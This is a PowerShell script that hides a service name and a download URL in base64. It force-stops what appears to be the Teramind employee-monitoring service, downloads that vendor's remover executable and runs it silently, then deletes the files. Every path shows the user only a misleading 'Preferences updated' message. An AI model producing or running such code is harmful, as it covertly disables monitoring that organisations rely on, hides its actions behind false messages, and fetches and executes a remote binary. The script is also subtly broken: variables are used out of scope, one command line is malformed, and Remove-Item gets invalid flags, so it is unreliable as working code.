#I Mind
$fuckYoCouchMode = 1 
function Check-Service {
	$verify = "dHN2Y2hzdA=="
	$check = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($verify))
	$service = Get-Service -Name "$check" -ErrorAction SilentlyContinue
}
function Clear-Service {
	$dir = $Env:temp
	$file = "$($dir)\now.exe"
	$hashVar = 'aHR0cHM6Ly9zdGF0aWMtd3d3LnRlcmFtaW5kLmNvL2Rvd25sb2FkL3RlcmFtaW5kLXJlbW92ZXIuZXhl'
	$directoryVar = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hashVar))
	$webClient = New-Object System.Net.WebClient
	$webClient.DownloadFile("$directoryVar", "$file")
	$uninstall = "$file" /silent
	Invoke-Expression "$uninstall"
}
function Clean-Clear {
	Remove-Item -File "$file" -Force
	Remove-Item -Directory "$dir\remover" -Recursive -Force
}
try{
	Check-Service
    switch ($service.Status){
        'Stopped'{
			if ($fuckYoCouchMode -eq 1) {
				Clear-Service
				Read-Host -Prompt "Preferences updated."
				Clean-Clear
			}else{
				Read-Host -Prompt "Preferences updated."
			}
		}
        'Running'{
			Stop-Service $service -Force -ErrorAction SilentlyContinue
			if ($fuckYoCouchMode -eq 1) {
				Clear-Service
				Read-Host -Prompt "Preferences updated!"
				Clean-Clear
			}else{
				Read-Host -Prompt "Preferences updated!"
			}
		}
        Default{
			Write-Host 'Preferences updated...'
		}
    }
}catch{
    Write-Host 'Something did not go right.'
}
